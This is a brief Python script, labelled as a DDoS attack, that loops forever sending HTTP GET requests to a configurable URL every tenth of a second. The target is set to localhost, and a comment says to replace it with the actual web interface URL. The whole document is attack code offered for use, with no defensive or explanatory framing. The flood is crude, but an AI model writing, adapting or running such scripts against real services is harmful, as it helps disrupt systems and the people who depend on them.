import requests
import time

url = 'http://127.0.0.1:10011'  # Replace with the actual web interface URL

def ddos_attack():
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(0.1)  # Adjust the speed of requests

ddos_attack()
